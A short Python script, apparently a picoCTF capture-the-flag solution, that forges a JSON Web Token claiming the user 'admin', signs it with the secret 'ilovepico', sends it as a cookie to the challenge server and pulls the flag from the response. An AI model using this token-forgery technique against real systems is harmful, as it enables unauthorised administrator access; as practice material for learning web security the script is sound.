import jwt
import requests
import re

url = "http://fickle-tempest.picoctf.net:57270"

payload = {
    "user": "admin"
}

token = jwt.encode(
    payload=payload,
    key="ilovepico",
    algorithm="HS256",
    headers={"typ": "JWT", "alg": "HS256"}
)

print(token)

res = requests.get(url, cookies={ 'jwt': token })

print(re.findall(r'(picoCTF{.+})', res.text)[0])